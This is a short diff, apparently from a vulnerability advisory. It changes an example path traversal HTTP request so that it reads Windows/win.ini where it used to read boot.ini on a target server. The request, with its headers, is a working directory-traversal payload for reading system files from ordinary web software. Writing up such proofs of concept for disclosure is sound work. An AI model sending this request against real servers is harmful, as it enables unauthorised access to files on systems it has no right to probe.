@@ -7,7 +7,7 @@ To exploit vulnerability, someone could use 'http://[host]/../../../../' request
 
 
 ```
-GET /../../../../Windows/boot.ini HTTP/1.1
+GET /../../../../Windows/win.ini HTTP/1.1
 Host: 192.168.43.102:8080
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
